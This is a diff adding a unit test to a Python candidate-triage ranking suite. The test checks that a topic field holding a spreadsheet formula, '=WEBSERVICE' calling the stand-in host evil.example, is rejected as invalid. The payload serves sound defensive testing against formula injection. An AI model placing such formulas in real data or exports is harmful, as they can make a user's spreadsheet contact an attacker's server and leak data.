@@ -99,6 +99,12 @@ class CandidateTriageTests(unittest.TestCase):
         self.assertEqual(self.rows()[0]["decision"], "SKIP")
         self.assertEqual(self.rows()[0]["source_url"], "")
 
+    def test_untrusted_topic_is_not_excel_formula(self):
+        self.add(1, topic_cluster="=WEBSERVICE('https://evil.example')")
+        result = rank(self.data, "x-superplay-english", "en")
+        self.assertEqual(result["skipped"], 1)
+        self.assertIn("INVALID_TOPIC_CLUSTER", self.rows()[0]["reason"])
+
     def test_private_data_guard_in_repository(self):
         with self.assertRaisesRegex(ValueError, "ignored .local"):
             initialize(ROOT / "projects" / "x-growth-en" / "actual-analytics")
